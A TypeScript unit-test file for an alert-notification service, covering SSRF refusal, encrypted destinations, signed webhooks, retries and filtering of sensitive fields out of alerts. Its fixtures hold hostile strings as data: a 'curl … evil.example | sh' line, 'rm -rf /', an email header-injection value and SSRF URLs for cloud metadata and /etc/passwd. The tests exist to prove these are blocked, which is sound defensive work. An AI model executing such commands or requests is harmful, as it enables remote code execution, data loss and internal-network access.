// Unit contract for alert delivery: destination validation and SSRF refusal,
// encryption at rest, webhook signatures, message formats (no sensitive
// fields), backoff and the dispatcher loop against a fake fetch and database.

import { createHmac, randomBytes } from "node:crypto";
import { describe, expect, it, vi } from "vitest";
import type { Mailer, MailMessage } from "../_shared/mailer.ts";
import {
	backoffSeconds,
	buildNotification,
	deliverMessage,
	type DeliveryDeps,
	DispatchError,
	emailContent,
	parseClaimedDeliveries,
	runNotificationDispatch,
	signatureHeader,
	notificationTitle as notificationTitleOf,
	slackPayload,
	teamsPayload,
	verifySignature,
} from "../_shared/notification-delivery.ts";
import {
	type ChannelTarget,
	checkTargetUrl,
	decryptTarget,
	encryptTarget,
	isBlockedAddress,
	parseKeyring,
	parseTarget,
	resolvePublicAddresses,
	targetHint,
} from "../_shared/notification-targets.ts";

const TENANT = "11111111-1111-4111-8111-111111111111";
const CHANNEL = "44444444-4444-4444-8444-444444444444";
const AGENT = "66666666-6666-4666-8666-666666666666";
const DELIVERY = "77777777-7777-4777-8777-777777777777";
const LEASE = "88888888-8888-4888-8888-888888888888";
const KEY_A = Buffer.alloc(32, 7).toString("base64");
const KEY_B = Buffer.alloc(32, 9).toString("base64");
const SLACK_URL = "https://hooks.slack.com/services/T000/B000/abcdefghijklmnopqrstuvwx";
const WEBHOOK_URL = "https://alerts.example.com/aidr/hook?token=supersecret";
// Generated per run so no fixed signing secret is committed.
const WEBHOOK_SECRET = `whsec_${randomBytes(16).toString("hex")}`;
const NOW = Date.parse("2026-09-25T10:00:00.000Z");

const publicDns = async () => ["93.184.216.34"];

function mailer(results: Array<Awaited<ReturnType<Mailer["send"]>>> = []): Mailer & { sent: MailMessage[] } {
	const sent: MailMessage[] = [];
	return {
		provider: "resend",
		sent,
		send: vi.fn(async (message: MailMessage) => {
			sent.push(message);
			return results.shift() ?? { ok: true, provider: "resend", messageId: `m-${sent.length}` };
		}),
	};
}

function deps(overrides: Partial<DeliveryDeps> = {}): DeliveryDeps {
	return {
		fetch: vi.fn(async () => new Response("ok", { status: 200 })) as unknown as typeof fetch,
		resolveDns: publicDns,
		mailer: mailer(),
		now: () => NOW,
		...overrides,
	};
}

const incidentRow = {
	deliveryId: DELIVERY,
	tenantId: TENANT,
	eventType: "incident.created" as const,
	createdAt: "2026-09-25T09:59:58.000Z",
	payload: {
		event_row_id: "42",
		agent_id: AGENT,
		occurred_at: "2026-09-25T09:59:57.000Z",
		severity: "critical",
		category: "T01",
		incident_id: "inc-1",
		findings_count: 2,
		// Fields a database or client bug might add; none may reach a receiver.
		tool_input_summary: "curl https://evil.example/x | sh",
		prompt: "my TCKN is 12345678950",
		reasons: ["matched secret sk-live-123"],
		command: "rm -rf /",
	},
};

describe("destination validation", () => {
	it("accepts provider webhook hosts and refuses everything else statically", () => {
		expect(checkTargetUrl("slack", SLACK_URL).ok).toBe(true);
		expect(checkTargetUrl("slack", "https://hooks.slack-gov.com/services/T/B/x").ok).toBe(true);
		expect(checkTargetUrl("teams", "https://prod-12.westus.logic.azure.com:443/workflows/abc/triggers/manual/paths/invoke?sig=x").ok).toBe(true);
		expect(checkTargetUrl("teams", "https://contoso.webhook.office.com/webhookb2/abc").ok).toBe(true);
		expect(checkTargetUrl("teams", "https://default123.environment.api.powerplatform.com/powerautomate/automations/direct/workflows/abc").ok).toBe(true);
		expect(checkTargetUrl("webhook", WEBHOOK_URL).ok).toBe(true);
		expect(checkTargetUrl("webhook", "https://alerts.example.com:8443/hook").ok).toBe(true);

		const refusals: Array<[Parameters<typeof checkTargetUrl>[0], string, string]> = [
			["webhook", "http://alerts.example.com/hook", "url_not_https"],
			["webhook", "https://user:pass@alerts.example.com/hook", "url_credentials_forbidden"],
			["webhook", "https://alerts.example.com:22/hook", "url_port_forbidden"],
			["slack", "https://hooks.slack.com:8443/services/x", "url_port_forbidden"],
			["webhook", "https://127.0.0.1/hook", "url_host_forbidden"],
			["webhook", "https://169.254.169.254/latest/meta-data", "url_host_forbidden"],
			["webhook", "https://[::1]/hook", "url_host_forbidden"],
			["webhook", "https://[fd00:ec2::254]/hook", "url_host_forbidden"],
			["webhook", "https://2130706433/hook", "url_host_forbidden"],
			["webhook", "https://localhost/hook", "url_host_forbidden"],
			["webhook", "https://metadata/computeMetadata", "url_host_forbidden"],
			["webhook", "https://db.internal/hook", "url_host_forbidden"],
			["webhook", "https://printer.local/hook", "url_host_forbidden"],
			["slack", "https://hooks.slack.com.evil.example/services/x", "url_host_not_allowed"],
			["slack", "https://evil.example/hooks.slack.com/services/x", "url_host_not_allowed"],
			["slack", "https://hooks.slack.com/api/chat.postMessage", "url_host_not_allowed"],
			["teams", "https://logic.azure.com.evil.example/x", "url_host_not_allowed"],
			["teams", "https://alerts.example.com/hook", "url_host_not_allowed"],
			["webhook", "file:///etc/passwd", "url_not_https"],
			["webhook", "not a url", "invalid_url"],
		];
		for (const [type, url, error] of refusals) {
			expect(checkTargetUrl(type, url), url).toEqual({ ok: false, error });
		}
	});

	it("parses each channel type's write-only target shape", () => {
		expect(parseTarget("slack", { url: SLACK_URL })).toEqual({ ok: true, target: { type: "slack", url: SLACK_URL } });
		expect(parseTarget("slack", { url: SLACK_URL, extra: 1 })).toEqual({ ok: false, error: "invalid_target" });
		expect(parseTarget("webhook", { url: WEBHOOK_URL, secret: "short" })).toEqual({ ok: false, error: "invalid_webhook_secret" });
		expect(parseTarget("webhook", { url: WEBHOOK_URL, secret: WEBHOOK_SECRET }).ok).toBe(true);
		expect(parseTarget("email", { recipients: [" SOC@Example.com ", "soc@example.com", "ir@example.com"] })).toEqual({
			ok: true,
			target: { type: "email", recipients: ["soc@example.com", "ir@example.com"] },
		});
		expect(parseTarget("email", { recipients: [] })).toEqual({ ok: false, error: "invalid_recipients" });
		expect(parseTarget("email", { recipients: Array.from({ length: 11 }, (_, i) => `a${i}@example.com`) }))
			.toEqual({ ok: false, error: "invalid_recipients" });
		expect(parseTarget("email", { recipients: ["a@example.com\r\nBcc: x@evil.example"] }))
			.toEqual({ ok: false, error: "invalid_recipients" });
	});

	it("shows only a host and digest prefix (or masked recipients) as the hint", async () => {
		const hint = await targetHint({ type: "webhook", url: WEBHOOK_URL, secret: WEBHOOK_SECRET });
		expect(hint).toMatch(/^alerts\.example\.com · #[0-9a-f]{6}$/);
		expect(hint).not.toContain("supersecret");
		const slack = await targetHint({ type: "slack", url: SLACK_URL });
		expect(slack).not.toContain("abcdefghijkl");
		expect(await targetHint({ type: "email", recipients: ["soc@example.com", "ir@example.com"] }))
			.toBe("s***@example.com +1 more");
	});
});

describe("SSRF address checks after DNS resolution", () => {
	it("classifies private, link-local, metadata and mapped addresses as blocked", () => {
		for (const address of [
			"0.0.0.0", "10.1.2.3", "100.64.0.1", "127.0.0.1", "169.254.169.254", "172.16.0.1", "172.31.255.255",
			"192.0.0.8", "192.168.1.1", "198.18.0.1", "224.0.0.1", "255.255.255.255", "::", "::1", "::ffff:10.0.0.1",
			"::ffff:169.254.169.254", "64:ff9b::a9fe:a9fe", "2002:a9fe:a9fe::1", "fc00::1", "fd00:ec2::254", "fe80::1",
			"ff02::1", "2001:db8::1", "[::1]", "not-an-ip", "",
		]) {
			expect(isBlockedAddress(address), address).toBe(true);
		}
		for (const address of ["93.184.216.34", "8.8.8.8", "172.32.0.1", "2606:4700:4700::1111", "::ffff:8.8.8.8"]) {
			expect(isBlockedAddress(address), address).toBe(false);
		}
	});

	it("refuses a host when any resolved address is internal, and reports resolver failures", async () => {
		expect(await resolvePublicAddresses("a.example", async () => ["93.184.216.34"])).toEqual({ ok: true, addresses: ["93.184.216.34"] });
		expect(await resolvePublicAddresses("a.example", async () => ["93.184.216.34", "10.0.0.5"])).toEqual({ ok: false, error: "ssrf_blocked" });
		expect(await resolvePublicAddresses("a.example", async () => ["169.254.169.254"])).toEqual({ ok: false, error: "ssrf_blocked" });
		expect(await resolvePublicAddresses("a.example", async () => [])).toEqual({ ok: false, error: "dns_unresolved" });
		expect(await resolvePublicAddresses("a.example", async () => {
			throw new Error("dns_unavailable");
		})).toEqual({ ok: false, error: "dns_unavailable" });
	});

	it("never contacts a webhook whose name resolves to the metadata service", async () => {
		const fetch = vi.fn();
		const outcome = await deliverMessage(
			{ type: "webhook", url: WEBHOOK_URL, secret: WEBHOOK_SECRET },
			buildNotification(incidentRow, "https://aidr.example.com"),
			deps({ fetch: fetch as unknown as typeof globalThis.fetch, resolveDns: async () => ["169.254.169.254"] }),
		);
		expect(outcome).toEqual({ outcome: "failed", error: "ssrf_blocked", statusCode: null, retryAfterSeconds: null });
		expect(fetch).not.toHaveBeenCalled();
	});
});

describe("encryption at rest", () => {
	it("round-trips with associated data and refuses a moved or tampered ciphertext", async () => {
		const keyring = await parseKeyring(`k2:${KEY_A},k1:${KEY_B}`);
		expect(keyring?.activeKeyId).toBe("k2");
		const target: ChannelTarget = { type: "webhook", url: WEBHOOK_URL, secret: WEBHOOK_SECRET };
		const binding = { tenantId: TENANT, channelId: CHANNEL, type: "webhook" as const };
		const sealed = await encryptTarget(keyring!, binding, target);
		expect(sealed.keyId).toBe("k2");
		expect(sealed.ciphertext).toMatch(/^v1\.k2\.[A-Za-z0-9_-]+$/);
		expect(sealed.ciphertext).not.toContain("supersecret");
		expect(await decryptTarget(keyring!, binding, sealed.ciphertext)).toEqual(target);
		// Bound to tenant, channel and type.
		expect(await decryptTarget(keyring!, { ...binding, tenantId: CHANNEL }, sealed.ciphertext)).toBeNull();
		expect(await decryptTarget(keyring!, { ...binding, channelId: TENANT }, sealed.ciphertext)).toBeNull();
		expect(await decryptTarget(keyring!, { ...binding, type: "slack" }, sealed.ciphertext)).toBeNull();
		const flipped = sealed.ciphertext.slice(0, -2) + (sealed.ciphertext.endsWith("A") ? "BA" : "AA");
		expect(await decryptTarget(keyring!, binding, flipped)).toBeNull();
		// A rotated-out key still decrypts while listed, and not after removal.
		const oldRing = await parseKeyring(`k1:${KEY_B}`);
		const old = await encryptTarget(oldRing!, binding, target);
		expect(await decryptTarget(keyring!, binding, old.ciphertext)).toEqual(target);
		expect(await decryptTarget((await parseKeyring(`k2:${KEY_A}`))!, binding, old.ciphertext)).toBeNull();
	});

	it("treats a malformed keyring as not configured", async () => {
		for (const value of ["", "k1", `K1:${KEY_A}`, "k1:c2hvcnQ=", `k1:${KEY_A},k1:${KEY_B}`, `:${KEY_A}`]) {
			expect(await parseKeyring(value), value).toBeNull();
		}
	});
});

describe("webhook signatures", () => {
	it("signs t.<body> with HMAC-SHA256 exactly as documented", async () => {
		const body = JSON.stringify({ hello: "world" });
		const header = await signatureHeader(WEBHOOK_SECRET, 1_790_000_000, body);
		const expected = createHmac("sha256", WEBHOOK_SECRET).update(`1790000000.${body}`).digest("hex");
		expect(header).toBe(`t=1790000000,v1=${expected}`);
		expect(await verifySignature(WEBHOOK_SECRET, header, body, 1_790_000_100)).toBe(true);
		expect(await verifySignature(WEBHOOK_SECRET, header, `${body} `, 1_790_000_100)).toBe(false);
		expect(await verifySignature("another-secret-another-secret-0000", header, body, 1_790_000_100)).toBe(false);
		expect(await verifySignature(WEBHOOK_SECRET, header, body, 1_790_000_000 + 301)).toBe(false);
		expect(await verifySignature(WEBHOOK_SECRET, null, body, 1_790_000_000)).toBe(false);
	});

	it("sends a signed, idempotent generic webhook whose body verifies", async () => {
		const fetch = vi.fn(async () => new Response(null, { status: 204 }));
		const message = buildNotification(incidentRow, "https://aidr.example.com");
		const outcome = await deliverMessage(
			{ type: "webhook", url: WEBHOOK_URL, secret: WEBHOOK_SECRET },
			message,
			deps({ fetch: fetch as unknown as typeof globalThis.fetch }),
		);
		expect(outcome.outcome).toBe("delivered");
		const [url, init] = fetch.mock.calls[0] as unknown as [string, RequestInit];
		expect(url).toBe(WEBHOOK_URL);
		expect(init.redirect).toBe("manual");
		const headers = init.headers as Record<string, string>;
		expect(headers["Idempotency-Key"]).toBe(DELIVERY);
		expect(headers["X-AIDR-Delivery-ID"]).toBe(DELIVERY);
		expect(headers["X-AIDR-Event"]).toBe("incident.created");
		expect(await verifySignature(WEBHOOK_SECRET, headers["X-AIDR-Signature"], String(init.body), NOW / 1000)).toBe(true);
		expect(JSON.parse(String(init.body))).toEqual(message);
	});
});

describe("message formats carry no sensitive fields", () => {
	const SENSITIVE = /curl|evil|TCKN|12345678950|sk-live|rm -rf|prompt|tool_input|reasons|command/i;

	it("projects only allow-listed identifiers, severities, categories and counts", () => {
		const message = buildNotification(incidentRow, "https://aidr.example.com/some/path?x=1");
		expect(message).toEqual({
			schema: "aidr.notification.v1",
			id: DELIVERY,
			event: "incident.created",
			test: false,
			occurred_at: "2026-09-25T09:59:57.000Z",
			tenant_id: TENANT,
			severity: "critical",
			category: "T01",
			// The original events keep the exact published v1 body.
			subject: { event_id: "42", agent_id: AGENT, incident_id: "inc-1" },
			counts: { findings: 2, blocked: null, window_minutes: null },
			links: { dashboard: "https://aidr.example.com/incidents" },
		});
		for (const rendered of [
			JSON.stringify(message),
			JSON.stringify(slackPayload(message)),
			JSON.stringify(teamsPayload(message)),
			JSON.stringify(emailContent(message)),
		]) {
			expect(rendered).not.toMatch(SENSITIVE);
		}
	});

	it("drops malformed identifiers and refuses non-https dashboard links", () => {
		const message = buildNotification({
			...incidentRow,
			payload: { severity: "urgent", category: "<script>", agent_id: "x", event_row_id: "1; drop", incident_id: "a b" },
		}, "http://aidr.example.com");
		expect(message.severity).toBeNull();
		expect(message.category).toBeNull();
		expect(message.subject).toEqual({ event_id: null, agent_id: null, incident_id: null });
		expect(message.links.dashboard).toBeNull();
	});

	it("renders Slack Block Kit and a Teams Adaptive Card with a deep link", () => {
		const message = buildNotification({
			...incidentRow,
			eventType: "privacy.blocked_spike",
			payload: { severity: "high", category: "privacy", blocked_count: 12, window_minutes: 15 },
		}, "https://aidr.example.com");
		const slack = slackPayload(message) as { text: string; blocks: Array<Record<string, unknown>> };
		expect(slack.text).toBe("Spike in blocked AI prompts: 12 in 15 min");
		expect(slack.blocks.map((block) => block.type)).toEqual(["header", "section", "actions", "context"]);
		expect(JSON.stringify(slack)).toContain("https://aidr.example.com/privacy-guard");
		const teams = teamsPayload(message) as { type: string; attachments: Array<{ contentType: string; content: Record<string, unknown> }> };
		expect(teams.type).toBe("message");
		expect(teams.attachments[0].contentType).toBe("application/vnd.microsoft.card.adaptive");
		expect(teams.attachments[0].content.type).toBe("AdaptiveCard");
		expect(teams.attachments[0].content.actions).toEqual([
			{ type: "Action.OpenUrl", title: "Open in AIDR", url: "https://aidr.example.com/privacy-guard" },
		]);
	});
});

describe("agent and governance alerts", () => {
	const SENSITIVE = /curl|evil|TCKN|12345678950|sk-live|rm -rf|prompt|justification|purpose|display_name|laptop/i;
	const REQUEST = "88888888-8888-4888-8888-888888888888";
	const row = (eventType: string, payload: Record<string, unknown>) => ({
		deliveryId: DELIVERY,
		tenantId: TENANT,
		eventType: eventType as "agent.offline",
		createdAt: "2026-09-25T09:59:58.000Z",
		payload: {
			...payload,
			// Nothing but the allow-list may reach a receiver.
			display_name: "alice-laptop",
			justification: "business purpose text",
			prompt: "my TCKN is 12345678950",
		},
	});

	function rendered(message: ReturnType<typeof buildNotification>) {
		return [
			JSON.stringify(message),
			JSON.stringify(slackPayload(message)),
			JSON.stringify(teamsPayload(message)),
			JSON.stringify(emailContent(message)),
		];
	}

	it("announces an offline agent and its recovery with identifiers and minutes only", () => {
		const offline = buildNotification(row("agent.offline", {
			agent_id: AGENT, category: "claude-code", offline_minutes: 240, occurred_at: "2026-09-25T05:00:00.000Z",
		}), "https://aidr.example.com");
		expect(offline).toMatchObject({
			event: "agent.offline",
			category: "claude-code",
			subject: { agent_id: AGENT },
			counts: { offline_minutes: 240 },
			links: { dashboard: "https://aidr.example.com/agents" },
		});
		expect(emailContent(offline).subject).toBe("[AIDR] Agent not seen for 240 min");
		expect(emailContent(offline).text).toContain("Last seen: 2026-09-25T05:00:00.000Z");
		const recovered = buildNotification(row("agent.recovered", { agent_id: AGENT, offline_minutes: 312 }), null);
		expect(slackPayload(recovered).text).toBe("Agent back online after 312 min");
		expect(emailContent(recovered).text).toContain("Offline for: 312 min");
		for (const text of [...rendered(offline), ...rendered(recovered)]) expect(text).not.toMatch(SENSITIVE);
	});

	it("announces an unprotected connector with its measured hook state only", () => {
		const removed = buildNotification(row("agent.unprotected", {
			agent_id: AGENT, category: "claude-code", connector_state: "hook_missing", severity: "high",
			occurred_at: "2026-10-14T05:00:00.000Z",
		}), "https://aidr.example.com");
		expect(removed).toMatchObject({
			event: "agent.unprotected",
			severity: "high",
			category: "claude-code",
			connector_state: "hook_missing",
			subject: { agent_id: AGENT },
			links: { dashboard: "https://aidr.example.com/agents" },
		});
		expect(emailContent(removed).subject).toBe("[AIDR] AIDR hook removed: claude-code");
		expect(emailContent(removed).text).toContain("Hook state: hook_missing");
		const attempt = buildNotification(row("agent.unprotected", {
			agent_id: AGENT, category: "cursor", connector_state: "disable_attempted",
		}), null);
		expect(slackPayload(attempt).text).toBe("Attempt to turn off locked protection: cursor");
		// An unknown state is dropped, never echoed to the receiver.
		const odd = buildNotification(row("agent.unprotected", { agent_id: AGENT, connector_state: "rm -rf /" }), null);
		expect(odd.connector_state).toBeNull();
		for (const text of [...rendered(removed), ...rendered(attempt), ...rendered(odd)]) expect(text).not.toMatch(SENSITIVE);
		// Other events keep their published v1 body without the new key.
		const offline = buildNotification(row("agent.offline", { agent_id: AGENT, connector_state: "hook_missing" }), null);
		expect("connector_state" in offline).toBe(false);
	});

	it("renders governance events with counts, request ids and governance deep links", () => {
		const overdue = buildNotification(row("governance.review_overdue", { items_count: 3, category: "ai_register" }), "https://aidr.example.com");
		expect(notificationTitleOf(overdue)).toBe("3 AI register items are past the review date");
		expect(overdue.links.dashboard).toBe("https://aidr.example.com/governance/register");
		const intake = buildNotification(row("governance.intake_requested", { request_id: REQUEST, category: "mcp_server" }), "https://aidr.example.com");
		expect(intake.subject.request_id).toBe(REQUEST);
		expect(intake.links.dashboard).toBe("https://aidr.example.com/governance/requests");
		const change = buildNotification(row("governance.change_pending", { request_id: "not-a-uuid", category: "dlp_publish" }), "https://aidr.example.com");
		expect(change.subject.request_id).toBeNull();
		expect(change.links.dashboard).toBe("https://aidr.example.com/governance/change-control");
		const expiring = buildNotification(row("governance.exception_expiring", { items_count: 1, window_days: 14 }), null);
		expect(notificationTitleOf(expiring)).toBe("1 AI governance exception expires within 14 days");
		for (const message of [overdue, intake, change, expiring]) {
			for (const text of rendered(message)) expect(text).not.toMatch(SENSITIVE);
		}
	});

	it("carries the governance digest as allow-listed counts and splits long Slack field lists", () => {
		const digest = buildNotification(row("governance.digest", {
			category: "weekly",
			occurred_at: "2026-09-21T00:00:00.000Z",
			period_from: "2026-09-14T00:00:00.000Z",
			period_to: "2026-09-21T00:00:00.000Z",
			digest: {
				agents_enrolled: 12, agents_active: 9, decisions_allow: 400, decisions_ask: 7, decisions_deny: 3,
				approvals_requested: 7, approvals_pending: 1, incidents_reported: 2, incidents_open: 1,
				incidents_open_critical: 0, browser_blocked: 5, browser_masked: 40, mcp_not_approved: 2,
				reviews_overdue: 1, intake_pending: 2, policy_changes_pending: 1,
				// Unknown or malformed values are dropped.
				owner_email: 5, agents_offline: -1, top_user: "alice@example.com",
			},
		}), "https://aidr.example.com");
		expect(digest.period).toEqual({ from: "2026-09-14T00:00:00.000Z", to: "2026-09-21T00:00:00.000Z" });
		expect(Object.keys(digest.digest ?? {})).toHaveLength(16);
		expect(JSON.stringify(digest)).not.toContain("alice");
		expect(JSON.stringify(digest)).not.toContain("owner_email");
		const slack = slackPayload(digest) as { text: string; blocks: Array<{ type: string; fields?: unknown[] }> };
		expect(slack.text).toBe("Weekly AI governance summary");
		const sections = slack.blocks.filter((block) => block.type === "section");
		expect(sections.length).toBeGreaterThan(1);
		for (const section of sections) expect(section.fields?.length ?? 0).toBeLessThanOrEqual(10);
		expect(emailContent(digest).text).toContain("Blocked actions: 3");
		expect(digest.links.dashboard).toBe("https://aidr.example.com/governance");
		// A digest field on another event type is never rendered.
		const other = buildNotification(row("governance.review_overdue", { items_count: 1, digest: { decisions_deny: 3 } }), null);
		expect(other.digest).toBeNull();
	});

	it("accepts the new event types from the claim RPC", () => {
		const claimed = parseClaimedDeliveries([{
			delivery_id: DELIVERY, lease_token: DELIVERY, tenant_id: TENANT, channel_id: DELIVERY, channel_type: "slack",
			target_ciphertext: "v1.k1.x", event_type: "agent.offline", payload: {}, attempts: 1, max_attempts: 8,
			created_at: "2026-09-25T09:59:58.000Z",
		}]);
		expect(claimed?.[0].eventType).toBe("agent.offline");
	});
});

describe("retry policy", () => {
	it("backs off exponentially with bounded jitter and honours Retry-After", () => {
		expect(backoffSeconds(1, () => 0.5)).toBe(30);
		expect(backoffSeconds(2, () => 0.5)).toBe(60);
		expect(backoffSeconds(5, () => 0.5)).toBe(480);
		expect(backoffSeconds(20, () => 0.5)).toBe(3600);
		expect(backoffSeconds(1, () => 0)).toBe(24);
		expect(backoffSeconds(1, () => 1)).toBe(36);
		expect(backoffSeconds(1, () => 0.5, 900)).toBe(900);
		expect(backoffSeconds(1, () => 0.5, 999_999)).toBe(3600);
	});

	it("maps receiver answers onto delivered, retry and permanent failure", async () => {
		const target: ChannelTarget = { type: "slack", url: SLACK_URL };
		const message = buildNotification(incidentRow, null);
		const answer = async (response: Response | Error) => deliverMessage(target, message, deps({
			fetch: (async () => {
				if (response instanceof Error) throw response;
				return response;
			}) as unknown as typeof fetch,
		}));
		expect((await answer(new Response("ok", { status: 200 }))).outcome).toBe("delivered");
		expect(await answer(new Response("", { status: 302, headers: { Location: "http://169.254.169.254/" } })))
			.toMatchObject({ outcome: "failed", error: "redirect_refused", statusCode: 302 });
		expect(await answer(new Response("invalid_token", { status: 403 })))
			.toMatchObject({ outcome: "failed", error: "receiver_rejected", statusCode: 403 });
		expect(await answer(new Response("", { status: 429, headers: { "Retry-After": "120" } })))
			.toEqual({ outcome: "retry", error: "receiver_rate_limited", statusCode: 429, retryAfterSeconds: 120 });
		expect(await answer(new Response("", { status: 503 }))).toMatchObject({ outcome: "retry", error: "receiver_unavailable" });
		expect(await answer(Object.assign(new Error("t"), { name: "TimeoutError" }))).toMatchObject({ outcome: "retry", error: "timeout" });
		expect(await answer(new TypeError("fetch failed"))).toMatchObject({ outcome: "retry", error: "network_error" });
	});

	it("sends e-mail per recipient with stable idempotency keys", async () => {
		const mail = mailer();
		const outcome = await deliverMessage(
			{ type: "email", recipients: ["soc@example.com", "ir@example.com"] },
			buildNotification(incidentRow, "https://aidr.example.com"),
			deps({ mailer: mail }),
		);
		expect(outcome.outcome).toBe("delivered");
		expect(mail.sent.map((message) => [message.to, message.idempotencyKey])).toEqual([
			["soc@example.com", `aidr-notification:${DELIVERY}:0`],
			["ir@example.com", `aidr-notification:${DELIVERY}:1`],
		]);
		expect(mail.sent[0].subject).toBe("[AIDR] New critical incident");
		expect(mail.sent[0].text).not.toMatch(/curl|TCKN|rm -rf/);
		const unconfigured: Mailer = { provider: "none", send: async () => ({ ok: false, reason: "not_configured" }) };
		expect((await deliverMessage({ type: "email", recipients: ["a@example.com"] }, buildNotification(incidentRow, null), deps({ mailer: unconfigured }))).error)
			.toBe("mail_not_configured");
		const flaky = mailer([{ ok: false, reason: "unavailable" }]);
		expect((await deliverMessage({ type: "email", recipients: ["a@example.com"] }, buildNotification(incidentRow, null), deps({ mailer: flaky }))).outcome)
			.toBe("retry");
	});
});

describe("dispatcher", () => {
	async function claimedRow(target: ChannelTarget, overrides: Partial<Record<string, unknown>> = {}) {
		const keyring = (await parseKeyring(`k1:${KEY_A}`))!;
		const sealed = await encryptTarget(keyring, { tenantId: TENANT, channelId: CHANNEL, type: target.type }, target);
		return {
			keyring,
			row: {
				delivery_id: DELIVERY,
				lease_token: LEASE,
				tenant_id: TENANT,
				channel_id: CHANNEL,
				channel_type: target.type,
				target_ciphertext: sealed.ciphertext,
				event_type: "incident.created",
				payload: incidentRow.payload,
				attempts: 1,
				max_attempts: 8,
				created_at: incidentRow.createdAt,
				...overrides,
			},
		};
	}

	function fakeDb(batches: unknown[][], completeStatus = (args: Record<string, unknown>) =>
		args.p_outcome === "delivered" ? "delivered" : args.p_outcome === "retry" ? "pending" : "dead") {
		const calls: Array<{ name: string; args: Record<string, unknown> }> = [];
		return {
			calls,
			rpc: vi.fn(async (name: string, args: Record<string, unknown>) => {
				calls.push({ name, args });
				if (name === "claim_notification_deliveries") return { data: batches.shift() ?? [], error: null };
				if (name === "complete_notification_delivery") return { data: { status: completeStatus(args) }, error: null };
				throw new Error(`unexpected rpc ${name}`);
			}),
		};
	}

	it("delivers claimed rows, records outcomes with backoff, and reuses the delivery id as idempotency key", async () => {
		const { keyring, row } = await claimedRow({ type: "webhook", url: WEBHOOK_URL, secret: WEBHOOK_SECRET });
		const second = { ...row, delivery_id: "99999999-9999-4999-8999-999999999999", lease_token: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", attempts: 3 };
		const db = fakeDb([[row, second]]);
		const responses = [new Response("", { status: 200 }), new Response("", { status: 503 })];
		const fetch = vi.fn(async () => responses.shift()!);
		const summary = await runNotificationDispatch(db, {
			...deps({ fetch: fetch as unknown as typeof globalThis.fetch }),
			keyring,
			dashboardUrl: "https://aidr.example.com",
			random: () => 0.5,
			concurrency: 1,
		});
		expect(summary).toMatchObject({ claimed: 2, delivered: 1, retrying: 1, dead: 0, leaseLost: 0 });
		const completes = db.calls.filter((call) => call.name === "complete_notification_delivery").map((call) => call.args);
		expect(completes).toEqual([
			{ p_delivery_id: DELIVERY, p_lease_token: LEASE, p_outcome: "delivered", p_error: null, p_status_code: 200, p_retry_in_seconds: null },
			{ p_delivery_id: second.delivery_id, p_lease_token: second.lease_token, p_outcome: "retry", p_error: "receiver_unavailable", p_status_code: 503, p_retry_in_seconds: 120 },
		]);
		const keys = fetch.mock.calls.map((call) => ((call as unknown as [string, RequestInit])[1].headers as Record<string, string>)["Idempotency-Key"]);
		expect(keys).toEqual([DELIVERY, second.delivery_id]);
		// The claim asked for due rows under a lease, with no specific delivery.
		expect(db.calls[0]).toEqual({ name: "claim_notification_deliveries", args: { p_limit: 25, p_lease_seconds: 120, p_delivery_id: null } });
	});

	it("marks an undecryptable destination dead without contacting anyone", async () => {
		const { keyring, row } = await claimedRow({ type: "slack", url: SLACK_URL });
		const moved = { ...row, tenant_id: "22222222-2222-4222-8222-222222222222" };
		const db = fakeDb([[moved]]);
		const fetch = vi.fn();
		const summary = await runNotificationDispatch(db, {
			...deps({ fetch: fetch as unknown as typeof globalThis.fetch }),
			keyring,
			dashboardUrl: null,
			random: () => 0.5,
		});
		expect(summary.dead).toBe(1);
		expect(fetch).not.toHaveBeenCalled();
		expect(db.calls[1].args).toMatchObject({ p_outcome: "failed", p_error: "decrypt_failed" });
	});

	it("fails closed on a malformed claim or a failed completion", async () => {
		const { keyring, row } = await claimedRow({ type: "slack", url: SLACK_URL });
		const options = { ...deps(), keyring, dashboardUrl: null, random: () => 0.5 };
		await expect(runNotificationDispatch(fakeDb([[{ ...row, lease_token: "nope" }]]), options))
			.rejects.toBeInstanceOf(DispatchError);
		const failing = {
			rpc: async (name: string) => name === "claim_notification_deliveries"
				? { data: [row], error: null }
				: { data: null, error: { message: "db down" } },
		};
		await expect(runNotificationDispatch(failing, options)).rejects.toMatchObject({ code: "complete_failed" });
		expect(parseClaimedDeliveries([{ ...row, channel_type: "sms" }])).toBeNull();
		expect(parseClaimedDeliveries([row])).toHaveLength(1);
	});

	it("claims exactly one named delivery for a console test send", async () => {
		const { keyring, row } = await claimedRow({ type: "teams", url: "https://prod-1.westus.logic.azure.com/workflows/x/triggers/manual/paths/invoke?sig=s" }, {
			event_type: "notification.test",
			payload: { occurred_at: "2026-09-25T09:59:59.000Z" },
			max_attempts: 1,
		});
		const db = fakeDb([[row], [row]]);
		const fetch = vi.fn(async () => new Response("", { status: 202 }));
		const summary = await runNotificationDispatch(db, {
			...deps({ fetch: fetch as unknown as typeof globalThis.fetch }),
			keyring,
			dashboardUrl: "https://aidr.example.com",
			random: () => 0.5,
			deliveryId: DELIVERY,
		});
		expect(summary.results).toEqual([{ deliveryId: DELIVERY, status: "delivered", error: null, statusCode: 202 }]);
		expect(db.calls.filter((call) => call.name === "claim_notification_deliveries")).toHaveLength(1);
		expect(db.calls[0].args).toEqual({ p_limit: 1, p_lease_seconds: 120, p_delivery_id: DELIVERY });
		const body = JSON.parse(String((fetch.mock.calls[0] as unknown as [string, RequestInit])[1].body));
		expect(body.attachments[0].content.body[0].text).toBe("Test notification from Singularity AIDR");
	});
});
